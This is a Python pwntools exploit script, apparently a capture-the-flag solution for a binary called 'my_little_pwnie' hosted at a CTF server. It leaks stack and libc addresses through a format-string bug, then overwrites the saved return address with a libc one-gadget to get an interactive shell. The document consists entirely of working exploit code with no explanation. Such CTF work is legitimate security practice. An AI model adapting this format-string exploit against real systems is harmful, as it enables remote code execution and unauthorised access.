#!/usr/bin/env python3

from pwn import *

exe = ELF("./my_little_pwnie")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})


def main():
    #r = conn()
    r = remote("pwnie.zajebistyc.tf", 17003)
    
    payload = b"%p %p"
    r.sendline(payload)

    stack_leak = int(r.recvuntil(" ").strip(), 16)
    libc_leak = int(r.recvline().strip(), 16)

    libc.address = libc_leak - libc.sym._IO_stdfile_0_lock
    log.warn("Libc base @ 0x%x", libc.address)
    log.warn("Stack leak @ 0x%x", stack_leak)
    
    return_value = stack_leak - 0x8

    payload = fmtstr_payload(6, {return_value:libc.address + 0x4f3d5})
    payload = payload.ljust(0x200, p8(0))
    pause()
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
